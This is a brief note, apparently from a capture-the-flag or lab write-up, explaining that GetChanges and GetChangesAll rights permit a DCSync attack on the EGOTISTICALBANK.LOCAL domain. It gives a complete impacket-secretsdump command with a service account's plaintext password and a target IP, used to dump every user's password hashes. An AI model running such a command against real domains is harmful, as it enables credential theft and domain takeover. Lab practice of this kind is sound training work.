
GetChanges & GetChangesAll allow us to perform an [[DCSync]] Attack!

We can dump the hashes of all users of the domain if we are authenticated.

```
impacket-secretsdump EGOTISTICALBANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.59.252
```
